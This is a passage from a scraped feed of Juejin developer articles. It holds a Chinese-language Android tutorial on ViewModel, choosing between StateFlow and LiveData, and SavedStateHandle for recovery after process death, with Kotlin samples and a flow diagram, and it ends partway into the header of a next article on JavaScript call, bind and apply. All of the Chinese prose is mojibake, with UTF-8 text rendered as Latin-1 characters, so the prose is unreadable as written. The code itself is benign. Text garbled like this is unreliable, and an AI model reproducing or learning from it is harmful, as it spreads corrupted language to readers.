<p><strong>é¿å…æŒæœ‰</strong>Â Activity ç­‰ç”Ÿå‘½å‘¨æœŸçŸ­çš„ Context å¼•ç”¨ï¼Œä»¥é˜²å†…å­˜æ³„æ¼ã€‚å¦‚æœç¡®å®éœ€è¦åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ä½¿ç”¨Â <code>AndroidViewModel</code>ï¼ˆå®ƒæ˜¯Â <code>ViewModel</code>Â çš„å­ç±»ï¼Œå†…éƒ¨æŒæœ‰Â <code>Application</code>Â Contextï¼‰ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>å¦‚ä½•åœ¨ Fragment é—´å…±äº«æ•°æ®ï¼Ÿ</strong></p>
<blockquote>
<p>è®© Fragments å…±äº«å®ƒä»¬å®¿ä¸» Activity ä½œç”¨åŸŸçš„ ViewModelã€‚ä½¿ç”¨Â <code>by activityViewModels()</code>Â å§”æ‰˜æ¥è·å–åŒä¸€ä¸ªå®ä¾‹ï¼Œä»è€Œå®ç°æ•°æ®å…±äº«å’Œé€šä¿¡<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_34358193%2Farticle%2Fdetails%2F141685543" target="_blank" title="https://blog.csdn.net/qq_34358193/article/details/141685543" ref="nofollow noopener noreferrer"/>ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>StateFlow ä¸ LiveData å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p>
<blockquote>






























<table><thead><tr><th>ç‰¹æ€§</th><th>LiveData</th><th>StateFlow</th></tr></thead><tbody><tr><td><strong>ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥</strong></td><td>åŸç”Ÿæ”¯æŒï¼Œè‡ªåŠ¨ç®¡ç†</td><td>éœ€è¦é…åˆÂ <code>repeatOnLifecycle</code>Â ç­‰æ‰‹åŠ¨æ§åˆ¶</td></tr><tr><td><strong>æ•°æ®é‡æ”¾</strong></td><td>é»˜è®¤ä»…æœ€æ–°å€¼</td><td>å§‹ç»ˆé‡æ”¾æœ€æ–°å€¼ç»™æ–°è®¢é˜…è€…</td></tr><tr><td><strong>åç¨‹æ”¯æŒ</strong></td><td>æœ‰é™</td><td>åŸç”Ÿæ”¯æŒï¼ŒåŸºäºåç¨‹</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>ç®€å• UI çŠ¶æ€ã€Java é¡¹ç›®</td><td>å¤æ‚æ•°æ®æµã€çº¯ Kotlin é¡¹ç›®ã€éœ€è¦æ›´å¤šæ“ä½œç¬¦</td></tr></tbody></table>
<p>åœ¨æ–°é¡¹ç›®ä¸­ï¼Œå¦‚æœå…¨é¢ä½¿ç”¨ Kotlin åç¨‹ï¼Œ<strong>æ›´æ¨èä½¿ç”¨ StateFlow</strong>ï¼Œå› ä¸ºå®ƒæä¾›æ›´ä¸¥æ ¼çš„çº¿ç¨‹æ§åˆ¶å’Œä¸°å¯Œçš„å˜æ¢æ“ä½œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fgitblog_00191%2Farticle%2Fdetails%2F153245612" target="_blank" title="https://blog.csdn.net/gitblog_00191/article/details/153245612" ref="nofollow noopener noreferrer"/>ã€‚å¦‚æœé¡¹ç›®ç®€å•æˆ–ä»éœ€æ”¯æŒ Javaï¼ŒLiveData ä»æ˜¯å¥½é€‰æ‹©ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>å¦‚ä½•é˜²æ­¢Â <code>viewModelScope</code>Â é€ æˆçš„å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<blockquote>
<p><code>viewModelScope</code>Â çš„è®¾è®¡å·²ç»è€ƒè™‘äº†ç”Ÿå‘½å‘¨æœŸï¼Œå®ƒä¼šåœ¨ ViewModel çš„Â <code>onCleared()</code>Â æ—¶è‡ªåŠ¨å–æ¶ˆã€‚å¼€å‘è€…éœ€è¦æ³¨æ„ï¼š</p>
<ol>
<li>ä¸è¦åœ¨Â <code>viewModelScope</code>Â ä¸­å¯åŠ¨æ— é™å¾ªç¯çš„åç¨‹ã€‚</li>
<li>åœ¨åç¨‹å†…éƒ¨è¿›è¡Œè€—æ—¶æ“ä½œæ—¶ï¼Œåº”ä½¿ç”¨Â <code>try/catch</code>Â æˆ–Â <code>CoroutineExceptionHandler</code>Â å¦¥å–„å¤„ç†å¼‚å¸¸ï¼Œé¿å…å› æœªæ•è·å¼‚å¸¸å¯¼è‡´ä½œç”¨åŸŸå–æ¶ˆé“¾æ–­è£‚ã€‚</li>
<li>å¯¹äºéœ€è¦è¶…å‡º ViewModel ç”Ÿå‘½å‘¨æœŸçš„ä»»åŠ¡ï¼ˆå¦‚ä¸Šä¼ æ—¥å¿—ï¼‰ï¼Œåº”ä½¿ç”¨Â <code>Application</code>Â ä½œç”¨åŸŸçš„åç¨‹æˆ–å…¶ä»–æœºåˆ¶ã€‚</li>
</ol>
</blockquote>
</li>
</ul>
<h2 data-id="heading-6">äºŒã€SavedStateHandle</h2>
<p>å½“åº”ç”¨è¿›ç¨‹è¢«ç³»ç»Ÿæ€æ­»ï¼ˆProcess Deathï¼‰åï¼Œ<code>SavedStateHandle</code>Â æ˜¯ç¡®ä¿å…³é”® UI çŠ¶æ€èƒ½å¤Ÿæ¢å¤çš„å…³é”®ç»„ä»¶ã€‚å®ƒä¸ ViewModel é›†æˆï¼Œæä¾›äº†ä¸€ç§æ¯”Â <code>onSaveInstanceState</code>Â æ›´ä¼˜é›…ã€æ›´å†…èšçš„æ•°æ®ä¿å­˜æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-7">ğŸ“‰ è¿›ç¨‹æ­»äº¡ vs. é…ç½®å˜æ›´</h3>
<p>é¦–å…ˆå¿…é¡»æ˜ç¡®è¿™ä¸¤è€…çš„æ ¹æœ¬åŒºåˆ«ï¼Œè¿™ä¹Ÿæ˜¯ç†è§£Â <code>SavedStateHandle</code>Â å¿…è¦æ€§çš„å‰æï¼š</p>


























<table><thead><tr><th>åœºæ™¯</th><th>è§¦å‘æ¡ä»¶</th><th>æ•°æ®å­˜å‚¨ä½ç½®</th><th>ViewModel æ˜¯å¦å­˜æ´»</th><th>æ¢å¤æœºåˆ¶</th></tr></thead><tbody><tr><td><strong>é…ç½®å˜æ›´</strong></td><td>å±å¹•æ—‹è½¬ã€è¯­è¨€åˆ‡æ¢ã€æ·±è‰²æ¨¡å¼åˆ‡æ¢ç­‰ã€‚</td><td><strong>å†…å­˜</strong>Â ä¸­ï¼ˆé€šè¿‡<code>ViewModelStore</code>ä¿ç•™ï¼‰ã€‚</td><td><strong>æ˜¯</strong>ï¼ŒViewModelå®ä¾‹è¢«ä¿ç•™ã€‚</td><td><strong>è‡ªåŠ¨</strong>ï¼Œç³»ç»Ÿé‡å»ºActivityå¹¶é‡æ–°å…³è”åŒä¸€ä¸ªViewModelã€‚</td></tr><tr><td><strong>è¿›ç¨‹æ­»äº¡</strong></td><td>ç³»ç»Ÿèµ„æºä¸è¶³ã€ç”¨æˆ·é•¿æ—¶é—´åˆ‡åˆ°åå°ã€åº”ç”¨å‘ç”Ÿå´©æºƒã€‚</td><td><strong>ç£ç›˜</strong>Â ä¸Šï¼ˆç”±ç³»ç»Ÿå°†Bundleå†™å…¥ç£ç›˜ï¼‰ã€‚</td><td><strong>å¦</strong>ï¼Œæ•´ä¸ªåº”ç”¨è¿›ç¨‹è¢«é”€æ¯ï¼Œå†…å­˜æ¸…ç©ºã€‚</td><td><strong>æ‰‹åŠ¨</strong>ï¼Œç³»ç»Ÿé‡å»ºActivityå’ŒViewModelï¼Œå¼€å‘è€…éœ€ä»<code>SavedStateHandle</code>æ¢å¤æ•°æ®ã€‚</td></tr></tbody></table>
<p>ç®€å•æ¥è¯´ï¼Œ<code>SavedStateHandle</code>Â å°±æ˜¯ ViewModel ä¸ºåº”å¯¹è¿›ç¨‹æ­»äº¡åœºæ™¯è€Œé…å¤‡çš„â€œ<strong>é€ƒç”ŸèƒŒåŒ…</strong>â€ã€‚å®ƒå…è®¸ä½ å°†å¿…è¦çš„çŠ¶æ€ï¼ˆå¦‚å½“å‰åˆ—è¡¨çš„æ»šåŠ¨ä½ç½®ã€ä¸´æ—¶å¡«å†™çš„è¡¨å•å†…å®¹ï¼‰æ‰“åŒ…å­˜ç›˜ï¼Œåœ¨ç”¨æˆ·å›æ¥æ—¶æ¢å¤ç°åœºã€‚</p>
<h3 data-id="heading-8">ğŸ§© SavedStateHandle æ ¸å¿ƒåŸç†ä¸å·¥ä½œæµç¨‹</h3>
<p>å…¶æ ¸å¿ƒåŸç†æ˜¯ï¼š<strong>å°†æ•°æ®ä¿å­˜åˆ°ç³»ç»Ÿç®¡ç†çš„Â <code>Bundle</code>Â ä¸­ï¼Œè¯¥ Bundle æœ€ç»ˆä¼šé€šè¿‡ Activity çš„Â <code>onSaveInstanceState()</code>Â æœºåˆ¶å†™å…¥ç£ç›˜ï¼Œå¹¶åœ¨é‡å»ºæ—¶æ¢å¤</strong>ã€‚</p>
<p>å®ƒçš„å·¥ä½œæµç¨‹å¯ä»¥é€šè¿‡ä¸‹å›¾å®Œæ•´å±•ç¤ºï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A["ç”¨æˆ·åœ¨ç•Œé¢æ“ä½œ&lt;br&gt;ï¼ˆå¦‚ç¼–è¾‘ã€æ»šåŠ¨ï¼‰"] --&gt; B["ViewModel é€šè¿‡ SavedStateHandle&lt;br&gt;æ›´æ–°çŠ¶æ€ (å¦‚ set)"]
    B --&gt; C[SusavedStateHandle å°†æ•°æ®å­˜å…¥&lt;br&gt;å†…éƒ¨ Bundle]
    
    subgraph D [è¿›ç¨‹æ­»äº¡ä¸æ¢å¤å‘¨æœŸ]
        D1[ç³»ç»Ÿå› å†…å­˜ä¸è¶³&lt;br&gt;æ€æ­»åº”ç”¨è¿›ç¨‹] --&gt; D2[è§¦å‘ Activity.onSaveInstanceState&lt;br&gt;SavedStateRegistry å°† Bundle å†™å…¥ç£ç›˜]
        D2 --&gt; D3["ç”¨æˆ·è¿”å›ï¼Œç³»ç»Ÿé‡å»ºè¿›ç¨‹"]
        D3 --&gt; D4[åˆ›å»ºæ–° ViewModel å®ä¾‹&lt;br&gt;å¹¶æ³¨å…¥æ¢å¤çš„ Bundle]
    end
    
    C -.-&gt;|"â€œè‡ªåŠ¨å…³è”â€"| D2
    D4 --&gt; E[æ–° ViewModel çš„ SavedStateHandle&lt;br&gt;åŒ…å«æ¢å¤çš„æ•°æ®]
    E --&gt; F[UI é€šè¿‡ LiveData/StateFlow&lt;br&gt;è§‚å¯Ÿåˆ°æ¢å¤çš„çŠ¶æ€å¹¶åˆ·æ–°]
</code></pre>
<p><strong>å…³é”®å®ç°ç»†èŠ‚</strong>ï¼š</p>
<ol>
<li><strong>è‡ªåŠ¨åºåˆ—åŒ–</strong>ï¼š<code>SavedStateHandle</code>Â å†…éƒ¨ä½¿ç”¨Â <code>BaseSavedStateRegistry</code>ï¼Œèƒ½è‡ªåŠ¨å¤„ç†å¯åºåˆ—åŒ–ï¼ˆ<code>Serializable</code>/<code>Parcelable</code>ï¼‰çš„æ•°æ®ç±»å‹ã€‚å¯¹äºå¤æ‚å¯¹è±¡ï¼Œéœ€è¦æ‰‹åŠ¨è½¬æ¢ï¼ˆå¦‚è½¬ä¸º JSON å­—ç¬¦ä¸²ï¼‰ã€‚</li>
<li><strong>ä¸ ViewModel é›†æˆ</strong>ï¼šå½“é€šè¿‡Â <code>ViewModelProvider</code>Â åˆ›å»ºå¸¦æœ‰Â <code>SavedStateHandle</code>Â å‚æ•°çš„ ViewModel æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†æ¢å¤çš„ Bundle æ³¨å…¥ã€‚</li>
<li><strong>è‡ªå®šä¹‰ä¿å­˜é€»è¾‘</strong>ï¼šé€šè¿‡Â <code>SavedStateRegistry</code>Â çš„Â <code>registerSavedStateProvider</code>Â æ–¹æ³•ï¼Œå¯ä»¥åœ¨ä¿å­˜æ—¶åˆ»åŠ¨æ€ç”Ÿæˆè¦ä¿å­˜çš„çŠ¶æ€ï¼Œé€‚ç”¨äºé‚£äº›æ— æ³•å®æ—¶åŒæ­¥åˆ°Â <code>SavedStateHandle</code>Â çš„å¤æ‚æ•°æ®ã€‚</li>
</ol>
<h3 data-id="heading-9">âš–ï¸ ä¸ä¼ ç»Ÿ onSaveInstanceState çš„å¯¹æ¯”</h3>
<p><code>SavedStateHandle</code>Â åœ¨æ¶æ„ä¸Šæ›´åŠ å…ˆè¿›ï¼š</p>



































<table><thead><tr><th>æ–¹é¢</th><th>ä¼ ç»ŸÂ <code>onSaveInstanceState</code></th><th><strong>ViewModel + SavedStateHandle</strong></th></tr></thead><tbody><tr><td><strong>ä¿å­˜ä½ç½®</strong></td><td>Activity/Fragment ä¸­ã€‚</td><td><strong>ViewModel</strong>Â ä¸­ï¼Œä¸æ•°æ®é€»è¾‘æ”¾åœ¨ä¸€èµ·ã€‚</td></tr><tr><td><strong>èŒè´£åˆ†ç¦»</strong></td><td>è¿åå•ä¸€èŒè´£ï¼ŒUIæ§åˆ¶å™¨éœ€è¦å…³å¿ƒæ•°æ®ä¿å­˜ã€‚</td><td>ç¬¦åˆå…³æ³¨ç‚¹åˆ†ç¦»ï¼ŒViewModelè´Ÿè´£æ•°æ®æŒä¹…åŒ–ã€‚</td></tr><tr><td><strong>æ•°æ®è®¿é—®</strong></td><td>éœ€è¦åœ¨<code>onCreate</code>ä¸­è¯»å–Bundleå¹¶æ‰‹åŠ¨åˆ†å‘ã€‚</td><td><strong>å¯è§‚å¯Ÿ</strong>ï¼Œé€šè¿‡<code>getLiveData()</code>ç›´æ¥æš´éœ²ç»™UIè§‚å¯Ÿã€‚</td></tr><tr><td><strong>ç±»å‹å®‰å…¨</strong></td><td>ä»Bundleå­˜å–æ•°æ®éœ€è¦é”®åï¼Œå®¹æ˜“å‡ºé”™ã€‚</td><td>é€šè¿‡é”®å€¼å¯¹å­˜å–ï¼Œå¹¶ä¸LiveData/StateFlowç»“åˆï¼Œç±»å‹æ›´å®‰å…¨ã€‚</td></tr><tr><td><strong>æµ‹è¯•ä¾¿åˆ©æ€§</strong></td><td>éš¾ä»¥æ¨¡æ‹Ÿç³»ç»Ÿä¿å­˜å’Œæ¢å¤çš„Bundleã€‚</td><td>ViewModelå¯ä»¥ç‹¬ç«‹æµ‹è¯•ï¼Œ<code>SavedStateHandle</code>å¯è½»æ¾æ¨¡æ‹Ÿã€‚</td></tr></tbody></table>
<h3 data-id="heading-10">ğŸ› ï¸ åœ¨ ViewModel ä¸­ä½¿ç”¨ SavedStateHandle</h3>
<p>åœ¨ ViewModel çš„æ„é€ å‡½æ•°ä¸­æ·»åŠ Â <code>SavedStateHandle</code>Â å‚æ•°å³å¯ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. åœ¨ ViewModel ä¸­æ¥æ”¶ SavedStateHandle</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> savedStateHandle: SavedStateHandle
) : ViewModel() {

    <span class="hljs-comment">// 2. å®šä¹‰çŠ¶æ€é”®ï¼ˆæ¨èä½¿ç”¨å¸¸é‡ï¼‰</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> SEARCH_QUERY_KEY = <span class="hljs-string">"search_query"</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> SELECTED_ITEM_ID_KEY = <span class="hljs-string">"selected_item_id"</span>
    }

    <span class="hljs-comment">// 3. æ–¹å¼ä¸€ï¼šè·å–ä¸€ä¸ªä¸çŠ¶æ€ç»‘å®šçš„ LiveData</span>
    <span class="hljs-comment">// åˆå§‹å€¼æ¥è‡ª savedStateHandleï¼ˆå¦‚æœè¿›ç¨‹æ­»äº¡åæ¢å¤ï¼Œåˆ™æœ‰å€¼ï¼›å¦åˆ™ä¸ºé»˜è®¤å€¼ï¼‰</span>
    <span class="hljs-keyword">val</span> searchQuery: LiveData&lt;String&gt; = 
        savedStateHandle.getLiveData(SEARCH_QUERY_KEY, <span class="hljs-string">""</span>)

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateSearchQuery</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// æ›´æ–° LiveData çš„å€¼ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨ä¿å­˜åˆ° SavedStateHandle</span>
        savedStateHandle[SEARCH_QUERY_KEY] = query
    }

    <span class="hljs-comment">// 4. æ–¹å¼äºŒï¼šè·å–ä¸€ä¸ªä¸çŠ¶æ€ç»‘å®šçš„ StateFlow (æ¨èç”¨äº Kotlin é¡¹ç›®)</span>
    <span class="hljs-keyword">val</span> selectedItemId: StateFlow&lt;<span class="hljs-built_in">Int</span>?&gt; = 
        savedStateHandle.getStateFlow(SELECTED_ITEM_ID_KEY, <span class="hljs-literal">null</span>)

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectItem</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span> {
        savedStateHandle[SELECTED_ITEM_ID_KEY] = id
    }

    <span class="hljs-comment">// 5. æ–¹å¼ä¸‰ï¼šç›´æ¥å­˜å–ï¼ˆé€‚ç”¨äºä¸éœ€è¦è§‚å¯Ÿçš„ç®€å•æ•°æ®ï¼‰</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">saveTempData</span><span class="hljs-params">(value: <span class="hljs-type">String</span>)</span></span> {
        savedStateHandle[<span class="hljs-string">"temp_key"</span>] = value
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getTempData</span><span class="hljs-params">()</span></span>: String? = savedStateHandle.<span class="hljs-keyword">get</span>&lt;String&gt;(<span class="hljs-string">"temp_key"</span>)

    <span class="hljs-comment">// 6. ç§»é™¤ä¸éœ€è¦æŒä¹…åŒ–çš„æ•°æ®</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">clearTempData</span><span class="hljs-params">()</span></span> {
        savedStateHandle.remove(<span class="hljs-string">"temp_key"</span>)
    }
}
</code></pre>
<p>åœ¨ Activity/Fragment ä¸­ï¼Œä½ æ— éœ€åšä»»ä½•ç‰¹æ®Šå¤„ç†ï¼Œåƒæ™®é€š ViewModel ä¸€æ ·è·å–å³å¯ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Activity/Fragment ä¸­ï¼Œåƒå¾€å¸¸ä¸€æ ·è·å– ViewModel</span>
<span class="hljs-comment">// ç³»ç»Ÿä¼šè‡ªåŠ¨å¤„ç† SavedStateHandle çš„æ³¨å…¥</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> viewModel: MyViewModel <span class="hljs-keyword">by</span> viewModels()

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onViewCreated</span><span class="hljs-params">(view: <span class="hljs-type">View</span>, savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
    <span class="hljs-keyword">super</span>.onViewCreated(view, savedInstanceState)
    <span class="hljs-comment">// ç›´æ¥è§‚å¯Ÿæ¥è‡ª SavedStateHandle çš„ LiveData/StateFlow</span>
    viewModel.searchQuery.observe(viewLifecycleOwner) { query -&gt;
        <span class="hljs-comment">// UI ä¼šè‡ªåŠ¨æ¥æ”¶åˆ°æ¢å¤çš„æœç´¢è¯</span>
        editText.setText(query)
    }
}
</code></pre>
<h3 data-id="heading-11">ğŸ’¡ æœ€ä½³å®è·µä¸è¦ç‚¹è¯¦è§£</h3>
<h4 data-id="heading-12">ä½¿ç”¨åŸåˆ™</h4>
<ul>
<li><strong>å­˜å°å­˜ç²¾</strong>ï¼šåªä¿å­˜<strong>æœ€å°å¿…è¦</strong>çš„ UI çŠ¶æ€ï¼ˆå¦‚ IDã€å…³é”®å­—ã€ç´¢å¼•ï¼‰ï¼Œè€Œéå®Œæ•´æ•°æ®å¯¹è±¡ï¼ˆå¦‚æ•´ä¸ªç”¨æˆ·åˆ—è¡¨ï¼‰ã€‚å®Œæ•´æ•°æ®åº”ä» Model å±‚ï¼ˆæ•°æ®åº“ã€ç½‘ç»œï¼‰é‡æ–°åŠ è½½ã€‚</li>
<li><strong>æ•°æ®ç±»å‹</strong>ï¼šä¼˜å…ˆä¿å­˜Â <code>Parcelable</code>,Â <code>Serializable</code>, åŸºç¡€ç±»å‹ï¼ˆ<code>Int</code>,Â <code>String</code>ï¼‰ã€‚å¤æ‚å¯¹è±¡éœ€æ‰‹åŠ¨åºåˆ—åŒ–ï¼ˆå¦‚ä½¿ç”¨ Gson è½¬ä¸º JSON å­—ç¬¦ä¸²ï¼‰ã€‚</li>
<li><strong>ç»„åˆä½¿ç”¨</strong>ï¼šå°†Â <code>SavedStateHandle</code>Â ç”¨äºâ€œè¿›ç¨‹æ­»äº¡æ¢å¤â€ï¼Œå°†Â <code>ViewModel</code>Â çš„å¸¸è§„å±æ€§ç”¨äºâ€œé…ç½®å˜æ›´ä¿ç•™â€ï¼Œå°† Room æ•°æ®åº“ç”¨äºâ€œæ°¸ä¹…å­˜å‚¨â€ã€‚</li>
</ul>
<h4 data-id="heading-13">è¦ç‚¹è¯¦è§£</h4>
<ul>
<li>
<p><strong><code>SavedStateHandle</code>Â ä¸Â <code>onSaveInstanceState</code>Â æœ‰ä»€ä¹ˆåŒºåˆ«å’Œè”ç³»ï¼Ÿ</strong></p>
<blockquote>
<p><strong>è”ç³»</strong>ï¼šåº•å±‚éƒ½é€šè¿‡ Activity çš„Â <code>onSaveInstanceState</code>Â æœºåˆ¶å°† Bundle å†™å…¥ç£ç›˜ã€‚<br/>
<strong>åŒºåˆ«</strong>ï¼š<code>SavedStateHandle</code>Â å°†ä¿å­˜é€»è¾‘<strong>ä¸Šç§»</strong>åˆ°äº† ViewModelï¼Œä½¿æ•°æ®ä¿å­˜æˆä¸ºä¸šåŠ¡é€»è¾‘çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è§†å›¾æ§åˆ¶å™¨çš„èŒè´£ï¼Œæ›´ç¬¦åˆæ¶æ„åŸåˆ™ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel å·²ç»èƒ½åœ¨æ—‹è½¬åä¿å­˜æ•°æ®ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦Â <code>SavedStateHandle</code>ï¼Ÿ</strong></p>
<blockquote>
<p>è¿™æ˜¯ä¸ºäº†åº”å¯¹Â  <strong>â€œè¿›ç¨‹æ­»äº¡â€</strong> Â è¿™ä¸€æ›´å½»åº•çš„æ•°æ®é”€æ¯åœºæ™¯ã€‚ViewModel çš„å­˜æ´»ä¾èµ–å†…å­˜ï¼Œè€Œè¿›ç¨‹æ­»äº¡åå†…å­˜æ¸…ç©ºã€‚<code>SavedStateHandle</code>Â é€šè¿‡ç£ç›˜å¤‡ä»½ï¼Œæä¾›äº†æœ€åä¸€é“ä¿éšœã€‚</p>
</blockquote>
</li>
<li>
<p><strong>ä»€ä¹ˆæ•°æ®åº”è¯¥ç”¨Â <code>SavedStateHandle</code>Â ä¿å­˜ï¼Ÿ</strong></p>
<blockquote>
<p>åº”ä¿å­˜<strong>ä¸´æ—¶ã€æ˜“å¤±ã€ä½†ç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒ</strong>çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>ç”¨æˆ·æ­£åœ¨å¡«å†™çš„è¡¨å•å†…å®¹ï¼ˆæœªæäº¤ï¼‰ã€‚</li>
<li>åˆ—è¡¨çš„æ»šåŠ¨ä½ç½®ã€‚</li>
<li>å½“å‰é€‰ä¸­çš„æ ‡ç­¾é¡µæˆ–ç­›é€‰æ¡ä»¶ã€‚</li>
<li>å¯¼èˆªæ ˆä¸­çš„å½“å‰ç›®çš„åœ°ï¼ˆå¦‚ç»“åˆ Navigation Componentï¼‰ã€‚</li>
</ul>
</blockquote>
</li>
<li>
<p><strong>å¦‚ä½•æµ‹è¯•åŒ…å«Â <code>SavedStateHandle</code>Â çš„ ViewModelï¼Ÿ</strong></p>
<p>å¯ä»¥ä½¿ç”¨Â <code>SavedStateHandle.createHandle()</code>Â åˆ›å»ºæµ‹è¯•ç”¨çš„å¥æŸ„ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testSavedStateHandle</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 1. åˆ›å»ºæ¨¡æ‹Ÿçš„ SavedStateHandle å¹¶å­˜å…¥åˆå§‹çŠ¶æ€</span>
    <span class="hljs-keyword">val</span> savedStateHandle = SavedStateHandle.createHandle(
        <span class="hljs-literal">null</span>, <span class="hljs-comment">// æ²¡æœ‰æ¢å¤çš„ Bundle</span>
        <span class="hljs-literal">null</span>
    )
    savedStateHandle[<span class="hljs-string">"key"</span>] = <span class="hljs-string">"initial_value"</span>

    <span class="hljs-comment">// 2. ä¼ å…¥ ViewModel è¿›è¡Œæµ‹è¯•</span>
    <span class="hljs-keyword">val</span> viewModel = MyViewModel(savedStateHandle)

    <span class="hljs-comment">// 3. æ–­è¨€è¡Œä¸º</span>
    assertEquals(<span class="hljs-string">"initial_value"</span>, viewModel.getSomeData())
}
</code></pre>
</li>
</ul>
<p>æ€»ç»“æ¥è¯´ï¼Œ<code>SavedStateHandle</code>Â æ˜¯æ„å»ºå¥å£® Android åº”ç”¨çš„é‡è¦å·¥å…·ï¼Œå®ƒå·§å¦™åœ°å°†è¿›ç¨‹æ­»äº¡æ¢å¤è¿™ä¸€ç³»ç»Ÿçº§æœºåˆ¶ï¼Œå°è£…æˆäº† ViewModel å†…éƒ¨ä¸€ä¸ªæ˜“äºç®¡ç†å’Œæµ‹è¯•çš„ç»„ä»¶ã€‚æ­£ç¡®ä½¿ç”¨å®ƒï¼Œèƒ½è®©ä½ çš„åº”ç”¨åœ¨æç«¯æƒ…å†µä¸‹ä¾ç„¶ä¸ºç”¨æˆ·æä¾›è¿è´¯çš„ä½“éªŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[call() ã€bindï¼ˆï¼‰ã€ apply() æœ‰å“ªäº›åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7602488966610239526</link>    <guid>https://juejin.cn/post/7602488966610239526</guid>    <pubDate>2026-02-03T15:58:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966610239526" data-draft-id="7602512226998468658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="call() ã€bindï¼ˆï¼‰ã€ apply() æœ‰å“ªäº›åŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-03T15:58:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            call() ã€bindï¼ˆï¼‰ã€ apply() æœ‰å“ªäº›åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T15:58:45.000Z" title="Tue Feb 03 2026 15:58:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
